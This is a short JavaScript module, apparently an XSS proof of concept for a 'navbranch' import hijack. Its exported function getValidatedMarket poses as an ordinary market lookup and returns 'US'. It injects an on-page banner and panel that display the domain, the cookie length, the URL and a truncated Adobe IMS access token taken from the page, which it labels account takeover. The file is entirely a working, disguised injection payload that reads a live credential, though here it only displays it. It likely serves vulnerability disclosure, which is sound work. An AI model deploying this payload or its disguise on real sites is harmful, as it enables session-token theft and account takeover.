export function getValidatedMarket() {
  const d = document.domain;
  const banner = document.createElement('div');
  banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#c00;color:#fff;padding:20px;z-index:999999;font-size:18px;text-align:center;font-family:sans-serif';
  banner.textContent = 'XSS PoC - navbranch import hijack on ' + d;
  document.body.prepend(banner);

  const info = document.createElement('pre');
  info.style.cssText = 'position:fixed;top:60px;left:20px;right:20px;background:#111;color:#0f0;padding:20px;z-index:999999;font-size:14px;font-family:monospace;max-height:60vh;overflow:auto;border-radius:8px';

  const lines = [];
  lines.push('[navbranch XSS] document.domain = ' + d);
  lines.push('[navbranch XSS] document.cookie length = ' + document.cookie.length + ' bytes');
  lines.push('[navbranch XSS] location = ' + location.href);

  try {
    if (window.adobeIMS && window.adobeIMS.getAccessToken) {
      const token = window.adobeIMS.getAccessToken();
      if (token && token.token) {
        lines.push('[navbranch XSS] IMS access_token = ' + token.token.substring(0, 40) + '...');
        lines.push('[navbranch XSS] IMPACT: Full IMS token theft -> Account Takeover');
      }
    }
  } catch (e) {
    lines.push('[navbranch XSS] IMS not loaded yet');
  }

  info.textContent = lines.join('\n');
  document.body.prepend(info);
  return 'US';
}
